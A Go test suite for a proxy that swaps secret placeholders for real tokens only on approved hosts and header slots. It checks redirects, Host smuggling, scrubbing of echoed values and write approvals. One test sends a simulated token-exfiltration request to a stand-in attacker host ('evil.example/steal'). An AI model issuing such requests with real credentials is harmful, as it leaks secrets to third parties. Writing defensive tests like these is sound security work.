package main

import (
	"compress/gzip"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

// These tests are written as attacks. Each one sends a placeholder through
// the proxy and checks where the real value ends up. The real value must
// only ever reach the host and slot its policy names.

const (
	allowedHost  = "gitlab.example"
	attackerHost = "evil.example"
	tokenValue   = "glpat-real-value-123"
)

var testPolicy = &Policy{Secrets: map[string]*Rule{
	"GITLAB_TOKEN":      {Hosts: []string{allowedHost}, Header: "Private-Token"},
	"REGISTRY_PASSWORD": {Hosts: []string{allowedHost}, BasicAuth: &BasicAuth{Username: "deploy-bot"}},
	"MAPS_KEY":          {Hosts: []string{allowedHost}, Query: "key"},
}}

var testValues = map[string]string{
	"GITLAB_TOKEN":      tokenValue,
	"REGISTRY_PASSWORD": "registry-real-pass",
	"MAPS_KEY":          "maps-real-key",
	// A project's own value, under its scope
	projectA + ":PROJECT_KEY": projectValue,
}

// seen is what a fake server received
type seen struct {
	Method string
	Host   string
	Path   string
	Query  url.Values
	Header http.Header
	Body   string
}

func (s seen) raw() string {
	return s.Method + " " + s.Host + s.Path + "?" + s.Query.Encode() + "\n" + headerText(s.Header) + "\n" + s.Body
}

func headerText(h http.Header) string {
	var b strings.Builder
	h.Write(&b)
	return b.String()
}

type fakeServer struct {
	mu   sync.Mutex
	got  []seen
	addr string
}

func (f *fakeServer) requests() []seen {
	f.mu.Lock()
	defer f.mu.Unlock()
	return slices.Clone(f.got)
}

func (f *fakeServer) handler(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		f.mu.Lock()
		f.got = append(f.got, seen{r.Method, r.Host, r.URL.Path, r.URL.Query(), r.Header.Clone(), string(body)})
		f.mu.Unlock()
		if next != nil {
			next(w, r)
		}
	}
}

type harness struct {
	t        *testing.T
	proxy    *Proxy
	proxyURL *url.URL
	entries  chan Entry
	allowed  *fakeServer
	attacker *fakeServer
	plain    *fakeServer
	lookups  []string
	scopeOf  map[string]string // secret name -> scope it was last looked up in
	audits   []AuditEntry
	roots    *x509.CertPool
	mu       sync.Mutex
	client   *http.Client
}

// newHarness starts the proxy with testPolicy plus three fake servers: the
// allowed host and an attacker over TLS, and the allowed host over plain
// HTTP. The proxy's dialer sends each host name to the matching server.
func newHarness(t *testing.T, allowedHandler http.HandlerFunc) *harness {
	t.Helper()
	h := &harness{t: t, entries: make(chan Entry, 32), scopeOf: map[string]string{}}

	// Real-looking certificates for the fake servers, from a separate CA
	// standing in for the public web PKI
	webCA, err := newAuthority([]string{allowedHost, attackerHost})
	if err != nil {
		t.Fatal(err)
	}
	startTLS := func(host string, handler http.HandlerFunc) *fakeServer {
		f := &fakeServer{}
		srv := httptest.NewUnstartedServer(f.handler(handler))
		cert, err := webCA.leaf(host)
		if err != nil {
			t.Fatal(err)
		}
		srv.TLS = &tls.Config{Certificates: []tls.Certificate{*cert}}
		srv.StartTLS()
		t.Cleanup(srv.Close)
		f.addr = srv.Listener.Addr().String()
		return f
	}
	h.allowed = startTLS(allowedHost, allowedHandler)
	h.attacker = startTLS(attackerHost, nil)
	h.plain = &fakeServer{}
	plainSrv := httptest.NewServer(h.plain.handler(nil))
	t.Cleanup(plainSrv.Close)
	h.plain.addr = plainSrv.Listener.Addr().String()

	lookup := func(scope, name string) (string, error) {
		h.mu.Lock()
		h.lookups = append(h.lookups, name)
		h.scopeOf[name] = scope
		h.mu.Unlock()
		if v, ok := testValues[scope+":"+name]; ok {
			return v, nil
		}
		if v, ok := testValues[name]; ok {
			return v, nil
		}
		return "", errors.New("not in the keychain")
	}
	h.proxy = NewProxy(func(e Entry) { h.entries <- e }, lookup)
	// No test may open a real dialog: ones that expect a question swap in
	// their own answers
	h.proxy.approver = newApprover(func(_ context.Context, req approvalRequest) answer {
		t.Errorf("unexpected approval dialog for %+v", req)
		return deny
	})
	h.proxy.audit = func(e AuditEntry) {
		h.mu.Lock()
		h.audits = append(h.audits, e)
		h.mu.Unlock()
	}
	routes := map[string]string{
		allowedHost + ":443":  h.allowed.addr,
		attackerHost + ":443": h.attacker.addr,
		allowedHost + ":80":   h.plain.addr,
	}
	var d net.Dialer
	h.proxy.dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if to, ok := routes[addr]; ok {
			return d.DialContext(ctx, network, to)
		}
		return nil, errors.New("no route to " + addr)
	}
	webRoots := x509.NewCertPool()
	webRoots.AddCert(webCA.cert)
	h.proxy.transport.TLSClientConfig = &tls.Config{RootCAs: webRoots}

	ca, err := h.proxy.SetPolicies(testPolicy, nil)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(h.proxy)
	t.Cleanup(srv.Close)
	h.proxyURL, _ = url.Parse(srv.URL)

	// The client trusts the web CA, as a real one trusts public roots, plus
	// the proxy's local CA, as the sandbox does through SSL_CERT_FILE
	h.roots = webRoots.Clone()
	h.roots.AddCert(ca.cert)
	h.client = h.clientFor("")
	return h
}

// clientFor returns a client that sends token as its proxy password, the way
// the guard sets HTTPS_PROXY for a project. An empty token sends none.
func (h *harness) clientFor(token string) *http.Client {
	proxyURL := *h.proxyURL
	if token != "" {
		proxyURL.User = url.UserPassword("blindfold", token)
	}
	return &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(&proxyURL), TLSClientConfig: &tls.Config{RootCAs: h.roots}},
		Timeout:   5 * time.Second,
	}
}

func (h *harness) do(req *http.Request) *http.Response {
	h.t.Helper()
	resp, _ := h.send(h.client, req)
	return resp
}

// send makes the request with client c and returns the response, with its
// body already read into the string
func (h *harness) send(c *http.Client, req *http.Request) (*http.Response, string) {
	h.t.Helper()
	resp, err := c.Do(req)
	if err != nil {
		h.t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp, string(body)
}

func newRequest(t *testing.T, method, rawURL, body string) *http.Request {
	t.Helper()
	req, err := http.NewRequest(method, rawURL, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	return req
}

func (h *harness) only(f *fakeServer) seen {
	h.t.Helper()
	got := f.requests()
	if len(got) != 1 {
		h.t.Fatalf("server got %d requests, want 1", len(got))
	}
	return got[0]
}

// assertNoValueReached fails if any real value shows up anywhere in what a
// server received, raw or base64-encoded
func assertNoValueReached(t *testing.T, f *fakeServer) {
	t.Helper()
	for _, r := range f.requests() {
		raw := r.raw()
		for name, v := range testValues {
			if strings.Contains(raw, v) || strings.Contains(raw, base64.StdEncoding.EncodeToString([]byte(v))) {
				t.Fatalf("value of %s reached a server it must not reach:\n%s", name, raw)
			}
		}
	}
}

func TestValueGoesIntoTheNamedHeaderOnly(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "POST", "https://"+allowedHost+"/api/v4/issues?title={{GITLAB_TOKEN}}", "body {{GITLAB_TOKEN}}")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
	req.Header.Set("X-Other", "{{GITLAB_TOKEN}}")

	if resp := h.do(req); resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d", resp.StatusCode)
	}

	got := h.only(h.allowed)
	if v := got.Header.Get("Private-Token"); v != tokenValue {
		t.Fatalf("Private-Token = %q", v)
	}
	// Writing the placeholder into an issue body on an allowed host must not
	// turn it into the value, or the agent could read it back from the issue
	if strings.Contains(got.Body, tokenValue) || got.Header.Get("X-Other") != "{{GITLAB_TOKEN}}" || got.Query.Get("title") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("value leaked outside its header: %+v", got)
	}

	e := nextEntry(t, h.entries)
	if e.Kind != "https" || e.Host != allowedHost || !slices.Equal(e.Secrets, []string{"GITLAB_TOKEN"}) {
		t.Fatalf("entry = %+v", e)
	}
}

func TestPlaceholderSentElsewhereStaysAPlaceholder(t *testing.T) {
	h := newHarness(t, nil)
	encoded := base64.StdEncoding.EncodeToString([]byte("{{GITLAB_TOKEN}}"))
	req := newRequest(t, "POST", "https://"+attackerHost+"/steal?t={{GITLAB_TOKEN}}", "{{GITLAB_TOKEN}} "+encoded)
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
	req.SetBasicAuth("deploy-bot", "{{REGISTRY_PASSWORD}}")

	h.do(req)

	got := h.only(h.attacker)
	if got.Header.Get("Private-Token") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("attacker got Private-Token %q", got.Header.Get("Private-Token"))
	}
	assertNoValueReached(t, h.attacker)
	if len(h.lookups) != 0 {
		t.Fatalf("proxy read %v for a host no policy names", h.lookups)
	}
}

func TestRedirectToAnotherHostCarriesOnlyThePlaceholder(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/redirect" {
			http.Redirect(w, r, "https://"+attackerHost+"/landing", http.StatusFound)
		}
	})
	req := newRequest(t, "GET", "https://"+allowedHost+"/redirect", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.do(req)

	got := h.only(h.attacker)
	if got.Path != "/landing" {
		t.Fatalf("redirect was not followed: %+v", got)
	}
	assertNoValueReached(t, h.attacker)
}

func TestRequestForAnotherHostInsideTheTunnelIsRefused(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Host = attackerHost
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusMisdirectedRequest {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	if n := len(h.allowed.requests()); n != 0 {
		t.Fatalf("request was forwarded %d times", n)
	}
	if len(h.lookups) != 0 {
		t.Fatalf("proxy read %v for a refused request", h.lookups)
	}
}

func TestBasicAuthPasswordIsFilledForTheRightUser(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/v2/", "")
	req.SetBasicAuth("deploy-bot", "{{REGISTRY_PASSWORD}}")

	h.do(req)

	user, pass, _ := (&http.Request{Header: h.only(h.allowed).Header}).BasicAuth()
	if user != "deploy-bot" || pass != testValues["REGISTRY_PASSWORD"] {
		t.Fatalf("basic auth = %q / %q", user, pass)
	}
}

func TestBasicAuthWithAnotherUserIsRefused(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/v2/", "")
	req.SetBasicAuth("someone-else", "{{REGISTRY_PASSWORD}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusBadGateway || len(h.allowed.requests()) != 0 {
		t.Fatalf("status = %d, forwarded = %d", resp.StatusCode, len(h.allowed.requests()))
	}
}

func TestQueryParameterIsFilled(t *testing.T) {
	h := newHarness(t, nil)

	h.do(newRequest(t, "GET", "https://"+allowedHost+"/maps?key={{MAPS_KEY}}&q={{MAPS_KEY}}", ""))

	got := h.only(h.allowed)
	if got.Query.Get("key") != testValues["MAPS_KEY"] || got.Query.Get("q") != "{{MAPS_KEY}}" {
		t.Fatalf("query = %v", got.Query)
	}
}

func TestPlainHTTPIsNeverFilled(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "http://"+allowedHost+"/api", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.do(req)

	if got := h.only(h.plain); got.Header.Get("Private-Token") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("value sent over plain HTTP: %q", got.Header.Get("Private-Token"))
	}
}

func TestMissingValueFailsTheRequest(t *testing.T) {
	h := newHarness(t, nil)
	h.withPolicy(&Policy{Secrets: map[string]*Rule{"UNSTORED": {Hosts: []string{allowedHost}, Header: "X-Key"}}})
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("X-Key", "{{UNSTORED}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusBadGateway || len(h.allowed.requests()) != 0 {
		t.Fatalf("status = %d, forwarded = %d", resp.StatusCode, len(h.allowed.requests()))
	}
	if got := h.audited(auditMissing); len(got) != 1 || got[0].Secret != "UNSTORED" {
		t.Fatalf("refused-missing = %+v", got)
	}
}

func TestRequestWithoutPlaceholdersIsForwardedUnchanged(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/public", "")
	req.Header.Set("Private-Token", "already-a-real-token")

	h.do(req)

	if got := h.only(h.allowed); got.Header.Get("Private-Token") != "already-a-real-token" {
		t.Fatalf("header = %q", got.Header.Get("Private-Token"))
	}
}

func TestCAIsMadeAgainOnlyWhenHostsChange(t *testing.T) {
	p := NewProxy(func(Entry) {}, nil)
	first, _ := p.SetPolicies(testPolicy, nil)

	same, _ := p.SetPolicies(&Policy{Secrets: map[string]*Rule{"X": {Hosts: []string{allowedHost}, Header: "X"}}}, nil)
	other, _ := p.SetPolicies(&Policy{Secrets: map[string]*Rule{"X": {Hosts: []string{"other.example"}, Header: "X"}}}, nil)
	none, _ := p.SetPolicies(&Policy{}, nil)

	if same != first || other == first || none != nil {
		t.Fatalf("first=%p same=%p other=%p none=%p", first, same, other, none)
	}
}

func TestEveryRequestOnAKeptAliveConnectionIsChecked(t *testing.T) {
	h := newHarness(t, nil)

	for i := 0; i < 3; i++ {
		req := newRequest(t, "GET", "https://"+allowedHost+"/again", "")
		req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
		if resp := h.do(req); resp.StatusCode != http.StatusOK {
			t.Fatalf("request %d: status %d", i, resp.StatusCode)
		}
	}
	sneaky := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	sneaky.Host = attackerHost
	sneaky.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	if resp := h.do(sneaky); resp.StatusCode != http.StatusMisdirectedRequest {
		t.Fatalf("a later request on the same connection got %d", resp.StatusCode)
	}
	for _, r := range h.allowed.requests() {
		if r.Header.Get("Private-Token") != tokenValue {
			t.Fatalf("request not filled: %+v", r)
		}
	}
	if n := len(h.allowed.requests()); n != 3 {
		t.Fatalf("upstream got %d requests, want 3", n)
	}
}

const (
	projectA     = "/work/a"
	tokenA       = "token-for-a"
	projectValue = "project-a-real-value"
)

// withPolicy swaps the global policy, keeping the same hosts so the CA the
// harness's clients trust stays the same
func (h *harness) withPolicy(pol *Policy) {
	h.t.Helper()
	if _, err := h.proxy.SetPolicies(pol, nil); err != nil {
		h.t.Fatal(err)
	}
}

// withProject adds project A's approved policy, on the same host so the CA
// the harness's clients trust stays the same
func (h *harness) withProject(rules map[string]*Rule) {
	h.t.Helper()
	projects := map[string]*Project{tokenA: {Path: projectA, Policy: &Policy{Secrets: rules}}}
	if _, err := h.proxy.SetPolicies(testPolicy, projects); err != nil {
		h.t.Fatal(err)
	}
}

func projectKeyRequest(t *testing.T) *http.Request {
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("X-Project-Key", "{{PROJECT_KEY}}")
	return req
}

func TestProjectTokenAddsTheProjectsRules(t *testing.T) {
	h := newHarness(t, nil)
	h.withProject(map[string]*Rule{"PROJECT_KEY": {Hosts: []string{allowedHost}, Header: "X-Project-Key"}})

	h.send(h.clientFor(tokenA), projectKeyRequest(t))

	if got := h.only(h.allowed).Header.Get("X-Project-Key"); got != projectValue {
		t.Fatalf("X-Project-Key = %q", got)
	}
	if scope := h.scopeOf["PROJECT_KEY"]; scope != projectA {
		t.Fatalf("PROJECT_KEY looked up in scope %q", scope)
	}
}

func TestProjectRulesNeedTheProjectsToken(t *testing.T) {
	for name, token := range map[string]string{"no token": "", "another token": "token-for-b"} {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t, nil)
			h.withProject(map[string]*Rule{"PROJECT_KEY": {Hosts: []string{allowedHost}, Header: "X-Project-Key"}})

			h.send(h.clientFor(token), projectKeyRequest(t))

			if got := h.only(h.allowed).Header.Get("X-Project-Key"); got != "{{PROJECT_KEY}}" {
				t.Fatalf("project secret filled without the project's token: %q", got)
			}
		})
	}
}

// An approved project policy still can't send a global secret somewhere new
func TestProjectCannotChangeAGlobalRule(t *testing.T) {
	h := newHarness(t, nil)
	h.withProject(map[string]*Rule{"GITLAB_TOKEN": {Hosts: []string{allowedHost}, Header: "X-Leak"}})
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("X-Leak", "{{GITLAB_TOKEN}}")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.send(h.clientFor(tokenA), req)

	got := h.only(h.allowed)
	if got.Header.Get("X-Leak") != "{{GITLAB_TOKEN}}" || got.Header.Get("Private-Token") != tokenValue {
		t.Fatalf("X-Leak = %q, Private-Token = %q", got.Header.Get("X-Leak"), got.Header.Get("Private-Token"))
	}
}

// A global secret is looked up in the global scope even for a project's request
func TestGlobalSecretsAreLookedUpGlobally(t *testing.T) {
	h := newHarness(t, nil)
	h.withProject(map[string]*Rule{"PROJECT_KEY": {Hosts: []string{allowedHost}, Header: "X-Project-Key"}})
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.send(h.clientFor(tokenA), req)

	if scope, ok := h.scopeOf["GITLAB_TOKEN"]; !ok || scope != "" {
		t.Fatalf("GITLAB_TOKEN looked up in scope %q", scope)
	}
}

// audited returns the audit entries with the given decision
func (h *harness) audited(decision string) []AuditEntry {
	h.mu.Lock()
	defer h.mu.Unlock()
	var out []AuditEntry
	for _, e := range h.audits {
		if e.Decision == decision {
			out = append(out, e)
		}
	}
	return out
}

func TestEchoedValueIsScrubbed(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Private-Token")
		w.Header().Set("X-Echo", token)
		io.WriteString(w, `{"you_sent":"`+token+`"}`)
	})
	req := newRequest(t, "GET", "https://"+allowedHost+"/echo?x=1", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	resp, body := h.send(h.client, req)

	if body != `{"you_sent":"{{GITLAB_TOKEN}}"}` || resp.Header.Get("X-Echo") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("value came back: header %q body %q", resp.Header.Get("X-Echo"), body)
	}
	if got := h.audited(auditFilled); len(got) != 1 || got[0].Secret != "GITLAB_TOKEN" || got[0].Path != "/echo" || got[0].Status != 200 {
		t.Fatalf("filled = %+v", got)
	}
	if got := h.audited(auditEchoed); len(got) != 1 || got[0].Detail != "2 copies" {
		t.Fatalf("echoed = %+v", got)
	}
}

// An API can keep a token and hand it back on a call that never sent it
func TestStoredValueReturnedLaterIsScrubbed(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "webhook secret: "+tokenValue)
	})

	_, body := h.send(h.client, newRequest(t, "GET", "https://"+allowedHost+"/hooks/1", ""))

	if strings.Contains(body, tokenValue) || !strings.Contains(body, "{{GITLAB_TOKEN}}") {
		t.Fatalf("body = %q", body)
	}
}

func TestGzippedResponseIsScrubbed(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		if !strings.Contains(r.Header.Get("Accept-Encoding"), "gzip") {
			io.WriteString(w, "not compressed: "+tokenValue)
			return
		}
		w.Header().Set("Content-Encoding", "gzip")
		gz := gzip.NewWriter(w)
		io.WriteString(gz, "compressed: "+tokenValue)
		gz.Close()
	})
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("Accept-Encoding", "gzip, br")

	_, body := h.send(h.client, req)

	if body != "compressed: {{GITLAB_TOKEN}}" {
		t.Fatalf("body = %q", body)
	}
}

func TestResponseThatCannotBeCheckedIsRefused(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Encoding", "br")
		io.WriteString(w, "pretend brotli: "+tokenValue)
	})

	resp, body := h.send(h.client, newRequest(t, "GET", "https://"+allowedHost+"/", ""))

	if resp.StatusCode != http.StatusBadGateway || strings.Contains(body, tokenValue) {
		t.Fatalf("status %d body %q", resp.StatusCode, body)
	}
	if got := h.audited(auditEncoding); len(got) != 1 || got[0].Detail != "br" {
		t.Fatalf("audit = %+v", got)
	}
}

func TestRefusalsAreAudited(t *testing.T) {
	h := newHarness(t, nil)

	misdirected := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	misdirected.Host = attackerHost
	h.do(misdirected)
	wrongUser := newRequest(t, "GET", "https://"+allowedHost+"/v2/", "")
	wrongUser.SetBasicAuth("someone-else", "{{REGISTRY_PASSWORD}}")
	h.do(wrongUser)
	stray := newRequest(t, "POST", "https://"+allowedHost+"/issues?title={{GITLAB_TOKEN}}", "")
	stray.Header.Set("X-Note", "{{GITLAB_TOKEN}}")
	h.do(stray)
	plain := newRequest(t, "GET", "http://"+allowedHost+"/api?key={{MAPS_KEY}}", "")
	h.do(plain)

	if got := h.audited(auditWrongHost); len(got) != 1 || got[0].Detail != "asked for "+attackerHost {
		t.Errorf("refused-host = %+v", got)
	}
	if got := h.audited(auditWrongUser); len(got) != 1 || got[0].Secret != "REGISTRY_PASSWORD" {
		t.Errorf("refused-username = %+v", got)
	}
	if got := h.audited(auditOutsideSlot); len(got) != 1 || got[0].Secret != "GITLAB_TOKEN" || got[0].Path != "/issues" {
		t.Errorf("outside-slot = %+v", got)
	}
	if got := h.audited(auditPlainHTTP); len(got) != 1 || got[0].Secret != "MAPS_KEY" || got[0].Path != "/api" {
		t.Errorf("plain-http = %+v", got)
	}
}

// gated returns a harness whose GITLAB_TOKEN asks before writes, answering
// dialogs with ans and recording what was asked
func gated(t *testing.T, ans answer) (*harness, *[]approvalRequest) {
	h := newHarness(t, nil)
	h.withPolicy(&Policy{Secrets: map[string]*Rule{
		"GITLAB_TOKEN": {Hosts: []string{allowedHost}, Header: "Private-Token", Approve: approveWrites},
	}})
	var asked []approvalRequest
	h.proxy.approver = newApprover(func(_ context.Context, req approvalRequest) answer {
		asked = append(asked, req)
		return ans
	})
	return h, &asked
}

func tokenRequest(t *testing.T, method string) *http.Request {
	req := newRequest(t, method, "https://"+allowedHost+"/api/v4/issues?private=1", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
	return req
}

func TestDeniedWriteNeverReachesTheServer(t *testing.T) {
	h, asked := gated(t, deny)

	resp := h.do(tokenRequest(t, "POST"))

	if resp.StatusCode != http.StatusForbidden || len(h.allowed.requests()) != 0 {
		t.Fatalf("status %d, forwarded %d", resp.StatusCode, len(h.allowed.requests()))
	}
	if _, read := h.scopeOf["GITLAB_TOKEN"]; read {
		t.Fatal("the value was read for a request that was denied")
	}
	want := approvalRequest{Secret: "GITLAB_TOKEN", Method: "POST", Host: allowedHost, Path: "/api/v4/issues"}
	if len(*asked) != 1 || (*asked)[0] != want {
		t.Fatalf("asked %+v", *asked)
	}
	if got := h.audited(auditApproval); len(got) != 1 || got[0].Detail != "denied" {
		t.Fatalf("audit = %+v", got)
	}
}

func TestApprovedWriteIsFilledAndAudited(t *testing.T) {
	h, _ := gated(t, allowOnce)

	h.do(tokenRequest(t, "POST"))

	if got := h.only(h.allowed).Header.Get("Private-Token"); got != tokenValue {
		t.Fatalf("Private-Token = %q", got)
	}
	if got := h.audited(auditFilled); len(got) != 1 || got[0].Detail != "approved once" {
		t.Fatalf("filled = %+v", got)
	}
}

func TestReadsDoNotAskWhenOnlyWritesAreGated(t *testing.T) {
	h, asked := gated(t, deny)

	h.do(tokenRequest(t, "GET"))

	if len(*asked) != 0 || h.only(h.allowed).Header.Get("Private-Token") != tokenValue {
		t.Fatalf("asked %+v", *asked)
	}
}

// Nothing to fill means nothing to approve, even for a gated host
func TestRequestWithoutThePlaceholderDoesNotAsk(t *testing.T) {
	h, asked := gated(t, deny)

	h.do(newRequest(t, "POST", "https://"+allowedHost+"/public", ""))

	if len(*asked) != 0 || len(h.allowed.requests()) != 1 {
		t.Fatalf("asked %+v", *asked)
	}
}
